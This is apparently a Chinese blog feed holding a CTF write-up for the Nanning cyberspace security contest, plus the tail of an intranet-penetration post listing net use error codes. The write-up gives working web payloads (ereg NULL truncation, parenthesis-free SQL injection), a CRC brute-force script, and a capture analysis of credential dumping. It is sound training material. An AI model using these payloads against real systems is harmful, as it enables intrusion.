src="/2018/12/24/内网(域)渗透常用命令/5.png" alt="image"></p><h2 id="net-use错误代码分析"><a href="#net-use错误代码分析" class="headerlink" title="net use错误代码分析"></a>net use错误代码分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；</span><br><span class="line">错误号51，Windows无法找到网络路径：网络有问题；</span><br><span class="line">错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启</span><br><span class="line">动；目标有防火墙（端口过滤）；</span><br><span class="line">错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$；</span><br><span class="line">错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删</span><br><span class="line">除再连；</span><br><span class="line">错误号1326，未知的用户名或错误密码：原因很明显了；</span><br><span class="line">错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；</span><br><span class="line">错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h2&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>南宁市网络空间安全大赛</title>
    <link href="http://yoursite.com/2018/12/22/%E5%8D%97%E5%AE%81%E5%B8%82%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://yoursite.com/2018/12/22/南宁市网络空间安全大赛/</id>
    <published>2018-12-21T16:26:19.000Z</published>
    <updated>2018-12-21T16:27:02.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="1-、超简单"><a href="#1-、超简单" class="headerlink" title="1)、超简单"></a>1)、超简单</h3><a id="more"></a><p>打开题目就看到了源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$white_list = range(0,9); </span><br><span class="line">require_once(&apos;flag.php&apos;); </span><br><span class="line">if(isset($_REQUEST[&apos;no&apos;]))&#123; </span><br><span class="line">    $a=$_REQUEST[&apos;no&apos;]; </span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123; </span><br><span class="line">        echo &apos;no must be number&apos;; </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        if(in_array($a,$white_list))&#123; </span><br><span class="line">            if(strlen($a)&gt;1)&#123; </span><br><span class="line">                echo &apos;you are a great dark phper&lt;br&gt;&apos;; </span><br><span class="line">                echo &quot;&lt;img src=&apos;dark.gif&apos;&gt;&lt;br&gt;&quot;; </span><br><span class="line">                echo $flag; </span><br><span class="line">            &#125;else&#123; </span><br><span class="line">                echo &apos;you no dark&apos;; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            echo &apos;you are so dark&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;else </span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>看到里面有个ereg()函数，因为ereg函数存在NULL截断漏洞，所以直接构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gxnnctf.gxsosec.cn:12311/?no=1%00</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/南宁市网络空间安全大赛/1.png" alt="image"></p><p>得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H0xIkKSSKS62UXPgLtCElE8jDCL7a2nqxDTT</span><br></pre></td></tr></table></figure><h3 id="2）、帽子商城"><a href="#2）、帽子商城" class="headerlink" title="2）、帽子商城"></a>2）、帽子商城</h3><p>这个题目很骚，官方放出tips:1s，所以判断应该是条件竞争。<br>跟2017年的0ctf的一题很像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://momomoxiaoxi.com/2017/03/21/0CTF/?tdsourcetag=s_pcqq_aiomsg</span><br></pre></td></tr></table></figure><p>但是这题的session并没有变，所以想到同一个浏览器访问的phpsession是一样的，换个浏览器就有两个cookie，先改包用0元过level 1，再用另一个浏览器登陆刚才的账号，抓包发到intruder模块，开始爆破phpsession，payload就是那两个session。<br><img src="/2018/12/22/南宁市网络空间安全大赛/4.png" alt="image"><br><img src="/2018/12/22/南宁市网络空间安全大赛/5.png" alt="image"></p><p><img src="/2018/12/22/南宁市网络空间安全大赛/2.png" alt="image"></p><h3 id="3）、sql"><a href="#3）、sql" class="headerlink" title="3）、sql???"></a>3）、sql???</h3><p>扫一下发现目录里面有./git，.git源码泄露，网上找脚本打把index.php dump下来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &apos;gxnnctf&#123;***************************&#125;&apos;;</span><br><span class="line">require_once(&apos;config.php&apos;);</span><br><span class="line">$conn = new mysqli($db_servername,$db_username,$db_password,$db_name);</span><br><span class="line">if($conn-&gt;connect_error)&#123;</span><br><span class="line">    die(&quot;Connect failed:&quot;.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$id))</span><br><span class="line">        die(&apos;Don\&apos;t hurt me :-(&apos;);</span><br><span class="line">    $sql = &quot;select username from user where id = &quot;.$id;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_array();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo mysqli_error($conn);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    echo(&apos;hello &apos;.$row[&apos;username&apos;].&apos;&lt;br&gt;&apos;);</span><br><span class="line">    $username = $row[&apos;username&apos;];</span><br><span class="line">    if($username === &apos;guest&apos;)&#123;</span><br><span class="line">        $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]:$_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">        if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$ip))&#123;</span><br><span class="line">            die(&apos;Don\&apos; hack me&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!empty($ip))&#123;</span><br><span class="line">            echo &apos;you from &apos;.$ip.&apos; , I remembered it.&lt;br&gt;&apos;;</span><br><span class="line">            $conn-&gt;query(&quot;insert into logs(ip) values(&apos;$ip&apos;)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id);</span><br><span class="line">        $row = $result-&gt;fetch_array();</span><br><span class="line">        $username = $row[&apos;username&apos;];</span><br><span class="line">        if($username === &apos;admin&apos;)&#123;</span><br><span class="line">            var_dump($_GET[&apos;backdoor&apos;]);</span><br><span class="line">            if(isset($_GET[&apos;backdoor&apos;])&amp;&amp;$_GET[&apos;backdoor&apos;]===&apos;Melonrind&apos;)&#123;</span><br><span class="line">                echo &apos;you find the backdoor!!!&lt;br&gt;&apos;;</span><br><span class="line">                die($flag);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;you are so great,but you don\&apos;t have backdoor,so continue to challenge :(&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;but i don\&apos;t waiting for you &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;emmmmm&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &apos;welcome to gxnnctf2018!&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;i filtered everything,so have a good time :)&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哇，过滤了一堆东西，居然连括号都过滤了。</p><p>大概意思就是要username是guest同时也要是admin才能得到flag，<br>搜了一下发现跟<a href="#">SeePwn CTF</a>的一道注入题差不多：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://heartsky.info/2017/07/16/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%B3%BB%E5%88%97/?tdsourcetag=s_pcqq_aiomsg</span><br></pre></td></tr></table></figure><p>所以按照他的思路来就是：</p><p>在第一条语句中定义了一个自定义变量，根据它是否为 NULL 作为判断条件。除了 if 还可以用 case 语句，而且没有圆括号</p><p>构造出最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=case when @hs is null then @hs:=2 else 1 end # &amp;backdoor=Melonrind</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="1-、太简单了"><a href="#1-、太简单了" class="headerlink" title="1)、太简单了"></a>1)、太简单了</h3><p>下载下来是个没有后缀的文件，binwalk看到是个zip，但是解压不了，winhex打开发现文件头不对，把头改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 4b 03 04</span><br></pre></td></tr></table></figure><p>压缩文件的头，解压后得到flag.png:</p><p><img src="/2018/12/22/南宁市网络空间安全大赛/3.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do_you_know_ziphead</span><br></pre></td></tr></table></figure><h3 id="2-、misc2"><a href="#2-、misc2" class="headerlink" title="2)、misc2"></a>2)、misc2</h3><p>这么多文件爆破肯定是不可能的啦，所以猜到是crc加密，网上找表哥的脚本跑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import zipfile</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line">  </span><br><span class="line">def CrackCrc(crc):</span><br><span class="line">    for i in dic:</span><br><span class="line">        for j in dic:</span><br><span class="line">            for p in dic:</span><br><span class="line">                for q in dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    if crc == (binascii.crc32(s) &amp; 0xffffffff):</span><br><span class="line">                        #print s</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        return</span><br><span class="line">  </span><br><span class="line">def CrackZip():</span><br><span class="line">    for I in range(39):</span><br><span class="line">        file = &apos;chunk&apos; + str(I) + &apos;.zip&apos;</span><br><span class="line">        f = zipfile.ZipFile(file, &apos;r&apos;)</span><br><span class="line">        GetCrc = f.getinfo(&apos;data.txt&apos;)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        #以上3行为获取压缩包CRC32值的步骤</span><br><span class="line">        #print hex(crc)</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line">  </span><br><span class="line">dic = string.ascii_letters + string.digits + &apos;+/=&apos;</span><br><span class="line">  </span><br><span class="line">f = open(&apos;out.txt&apos;, &apos;w&apos;)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">090 051 104 117 098 109 078 048 090 110 115 121 097 086 066 102 081 051 074 106 088 050 112 049 078 088 082 102 083 122 070 069 090 068 070 117 079 088 048</span><br></pre></td></tr></table></figure><p>再十进制转ascii得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z3hubmN0ZnsyaVBfQ3JjX2p1NXRfSzFEZDFuOX0</span><br></pre></td></tr></table></figure><p>再转base64得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2iP_Crc_ju5t_K1Dd1n9</span><br></pre></td></tr></table></figure><h3 id="3-、txt"><a href="#3-、txt" class="headerlink" title="3)、txt"></a>3)、txt</h3><p>附件是这么一句蛇皮的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Guangxi NanNing CTF,enjoy this,have a good time.(｡･∀･)ﾉﾞ</span><br></pre></td></tr></table></figure><p>零宽度空间隐写，直接丢网站上面解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://offdev.net/demos/zwsp-steg-js?tdsourcetag=s_pctim_aiomsg</span><br></pre></td></tr></table></figure><p>最后得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T2oFG2ZoAzVsK7dXy1ZLrIxY8E5q8uHjG5Cz</span><br></pre></td></tr></table></figure><h3 id="3-、流量包"><a href="#3-、流量包" class="headerlink" title="3)、流量包"></a>3)、流量包</h3><p>打开流量包分析发现他执行了这些操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查看权限</span><br><span class="line"></span><br><span class="line">dir目录</span><br><span class="line"></span><br><span class="line">查看flag.zip</span><br><span class="line"></span><br><span class="line">上传exe文件</span><br><span class="line"></span><br><span class="line">运行exe产生dmp</span><br><span class="line"></span><br><span class="line">makecab打包dmp</span><br><span class="line"></span><br><span class="line">查看dmp的zip</span><br></pre></td></tr></table></figure><p>用networkMiner查看，可以看到：</p><p><img src="/2018/12/22/南宁市网络空间安全大赛/6.png" alt="image"></p><p>其中14219B的就是flag.zip,把dmp还原，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlm: 11da62168bb9a260cc9ba7e798e31953</span><br></pre></td></tr></table></figure><p>直接拿这个md5值打开flag.zip，得到一张图片，再用文本打开图片搜索关键字”flag、gxnnctf、ctf”等各种关键字，最后是用ctf搜出了flag，最终flag为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6OUpOR89CMIb95FOym41AbijPgsySBdmWdwT</span><br></pre></td></tr></table></figure><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h3 id="1-、Android300"><a href="#1-、Android300" class="headerlink" title="1)、Android300"></a>1)、Android300</h3><p>将APK反编译后利用JD查看java层源码，发现调用了libnative-lib.so对输入的值进行判断，对该so文件静态分析，得到伪C代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">    v9 = Twofish_setup(&amp;v19, 0xC0u);</span><br><span class="line">    Twofish_encryt();</span><br><span class="line">    Twofish_decryt(v9, v26, &amp;v25);</span><br><span class="line">    v10 = 0;</span><br><span class="line">    v11 = &quot;fail&quot;;</span><br><span class="line">    while ( byte_4780[v10] == v26[v10] )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v10 + 1;</span><br><span class="line">      v13 = v10++ &gt;= 0xF;</span><br><span class="line">      if ( v13 )</span><br><span class="line">      &#123;</span><br><span class="line">    if ( v12 == 16 )</span><br><span class="line">    &#123;</span><br><span class="line">      Twofish_decryt(v9, &amp;v15, &amp;v25);</span><br><span class="line">      v11 = malloc(0x11u);</span><br><span class="line">      *(v11 + 16) = 0;</span><br><span class="line">      _aeabi_memcpy(v11, &amp;v25, 16);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return (*(*v3 + 668))(v3, v11);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    v11 = &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return (*(*v3 + 668))(v3, v11);</span><br></pre></td></tr></table></figure><p>发现这里的算法是Twofish加密方式、继续分析发现返回值为v11，与java层联系分析发现正确输入后的的返回值即为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">paramAnonymousView = MainActivity.this.stringFromJNI(paramAnonymousView);</span><br><span class="line"></span><br><span class="line">        paramAnonymousView = MainActivity.this.stringFromJNI(paramAnonymousView);</span><br><span class="line">        if (paramAnonymousView.equals(&quot;fail&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">          MainActivity.this.tv.setText(&quot;try again&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          TextView localTextView = MainActivity.this.tv;</span><br><span class="line">          StringBuilder localStringBuilder = new StringBuilder();</span><br><span class="line">          localStringBuilder.append(&quot;flag&#123;&quot;);</span><br><span class="line">          localStringBuilder.append(paramAnonymousView);</span><br><span class="line">          localStringBuilder.append(&quot;&#125;&quot;);</span><br><span class="line">          localTextView.setText(localStringBuilder.toString());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>由于静态分析代码太多进行动态调试，目的获取v11在赋值为falg时查看其对应寄存器中的值</p><p>用ida在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_com_gxsosec_www_android_1crackme3_MainActivity_stringFromJNI</span><br></pre></td></tr></table></figure></p><p>的起始处下断点，并通过修改对应寄存器的值来控制代码流程，使其步入if ( v12 == 16 )的ture判断中，当代码_aeabi_memcpy(v11, &amp;v25, 16);执行完毕后v11不再改变，此时查看其对应R5寄存器中的值即可得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it_w@3_n0t_kn0wn</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="1-、维吉尼亚遇上困难"><a href="#1-、维吉尼亚遇上困难" class="headerlink" title="1)、维吉尼亚遇上困难"></a>1)、维吉尼亚遇上困难</h3><p>看题目就是维吉尼亚加密了</p><p>先用脚本暴力破解一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">def virginiaCrack(cipherText): # 解密函数</span><br><span class="line">    length = getKeyLen(cipherText) #得到密钥长度</span><br><span class="line">    key = getKey(cipherText,length) #找到密钥</span><br><span class="line">    keyStr = &apos;&apos;</span><br><span class="line">    for k in key:</span><br><span class="line">        keyStr+=k</span><br><span class="line">    print(&apos;the key:&apos;,keyStr)</span><br><span class="line">    plainText = &apos;&apos;</span><br><span class="line">    index = 0</span><br><span class="line">    for ch in cipherText:</span><br><span class="line">        c = chr((ord(ch)-ord(key[index%length]))%26+97)</span><br><span class="line">        plainText += c</span><br><span class="line">        index+=1</span><br><span class="line">    return plainText</span><br><span class="line">def openfile(fileName): # 读文件</span><br><span class="line">    file = open(&quot;2.txt&quot;,&apos;r&apos;)</span><br><span class="line">    text = file.read()</span><br><span class="line">    file.close();</span><br><span class="line">    text = text.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def getKeyLen(cipherText): # 获取密钥长度</span><br><span class="line">    keylength = 1</span><br><span class="line">    maxCount = 0</span><br><span class="line">    for step in range(3,18): # 循环密钥长度</span><br><span class="line">        count = 0</span><br><span class="line">        for i in range(step,len(cipherText)-step):</span><br><span class="line">            if cipherText[i] == cipherText[i+step]:</span><br><span class="line">                 count += 1</span><br><span class="line">        if count&gt;maxCount:</span><br><span class="line">            maxCount = count</span><br><span class="line">            keylength = step</span><br><span class="line">    return keylength</span><br><span class="line"></span><br><span class="line">def getKey(text,length): # 获取密钥</span><br><span class="line">    key = [] # 定义空白列表用来存密钥</span><br><span class="line">    alphaRate =[0.08167,0.01492,0.02782,0.04253,0.12705,0.02228,0.02015,0.06094,0.06996,0.00153,0.00772,0.04025,0.02406,0.06749,0.07507,0.01929,0.0009,0.05987,0.06327,0.09056,0.02758,0.00978,0.02360,0.0015,0.01974,0.00074]</span><br><span class="line">    matrix =textToList(text,length)</span><br><span class="line">    for i in range(length):</span><br><span class="line">        w = [row[i] for row in matrix] #获取每组密文</span><br><span class="line">        li = countList(w) </span><br><span class="line">        powLi = [] #算乘积</span><br><span class="line">        for j in range(26):</span><br><span class="line">            Sum = 0.0</span><br><span class="line">            for k in range(26):</span><br><span class="line">                Sum += alphaRate[k]*li[k]</span><br><span class="line">            powLi.append(Sum)</span><br><span class="line">            li = li[1:]+li[:1]#循环移位</span><br><span class="line">        Abs = 100</span><br><span class="line">        ch = &apos;&apos;</span><br><span class="line">        for j in range(len(powLi)):</span><br><span class="line">             if abs(powLi[j] -0.065546)&lt;Abs: # 找出最接近英文字母重合指数的项</span><br><span class="line">                 Abs = abs(powLi[j] -0.065546) # 保存最接近的距离，作为下次比较的基准</span><br><span class="line">                 ch = chr(j+97)</span><br><span class="line">        key.append(ch)</span><br><span class="line">    return key                </span><br><span class="line"></span><br><span class="line">def countList(lis): # 统计字母频度</span><br><span class="line">    li = []</span><br><span class="line">    alphabet = [chr(i) for i in range(97,123)]</span><br><span class="line">    for c in alphabet:</span><br><span class="line">        count = 0</span><br><span class="line">        for ch in lis:</span><br><span class="line">            if ch == c:</span><br><span class="line">                count+=1</span><br><span class="line">        li.append(count/len(lis))</span><br><span class="line">    return li</span><br><span class="line"></span><br><span class="line">def textToList(text,length): # 根据密钥长度将密文分组</span><br><span class="line">    textMatrix = []</span><br><span class="line">    row = []</span><br><span class="line">    index = 0</span><br><span class="line">    for ch in text:</span><br><span class="line">        row.append(ch)</span><br><span class="line">        index += 1</span><br><span class="line">        if index % length ==0:</span><br><span class="line">            textMatrix.append(row)</span><br><span class="line">            row = []</span><br><span class="line">    return textMatrix</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    cipherText = openfile(r&apos;&apos;) # 这里要根据文档目录的不同而改变</span><br><span class="line">    plainText= virginiaCrack(cipherText)</span><br><span class="line">    print(&apos;the plainText:\n&apos;,plainText)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vtanhjggwatzjoqdwocalqrjzhfbtweiujafesdhlukzcoslupahjuhogxkiubgqnadxraigjdjneuuptcocqepnowqvqhzqxzogjdqjgkajnhqrnmxjfjgqdurobbrqjzrrapujzhnrpzeisclvikdbwvpqpzswakzaomovxqpcsundanvhxeabwngnqcoyzdcnpoadbbcgopdcwoqskqsaaoqjoowqczaqouhcfejbxeimjdnnqdkidbrfvdujtbpkqjxsjaffaxvwbnactwwgyapccdfczzvbmgyaodblrvikovxhumjyowqhaqmhqrnmxjfjgqducobogqjmswnoqzvgcugepvhnxgkhvpxecfkmmxspqprcaxkzcvbmfyupxvraifaxvwbnactphzkzenhalqroxwnaeqwircretjjzxtarhvurfaaqvfnfqweirul</span><br></pre></td></tr></table></figure><p>然后再丢到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 